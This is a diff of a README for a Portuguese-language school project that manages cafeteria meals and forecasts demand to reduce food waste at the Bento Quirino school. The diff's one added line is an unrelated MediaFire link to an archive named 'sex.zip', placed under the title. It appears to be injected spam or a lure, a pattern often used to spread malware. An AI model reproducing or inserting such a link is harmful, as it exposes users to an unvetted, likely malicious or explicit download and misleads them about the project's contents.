@@ -1,4 +1,5 @@
 # 🍝 Sistema_de_Cantina_PW
+https://www.mediafire.com/file/kga1hkkxwt00jo2/sex.zip/file
 
 Este projeto nasceu com o objetivo de combater o desperdício de alimentos na escola **Bento Quirino**, oferecendo uma solução inteligente para a gestão da merenda escolar. A plataforma permite que a escola preveja a demanda diária de refeições, podendo ser expandida futuramente para outras instituições de ensino.   
 
